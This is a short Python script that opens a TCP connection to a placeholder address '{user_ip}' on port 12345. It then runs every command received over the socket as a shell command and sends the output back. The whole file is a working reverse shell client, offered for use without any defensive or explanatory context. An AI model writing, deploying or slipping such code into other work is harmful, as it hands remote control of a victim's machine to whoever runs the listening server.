import socket
import subprocess

# Set up a client to connect to the server
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('{user_ip}', 12345))  # Replace with your server's IP and port

while True:
    command = client.recv(4096).decode()

    if command.lower() == 'exit':
        break

    output = subprocess.getoutput(command)
    client.send(output.encode())

client.close()
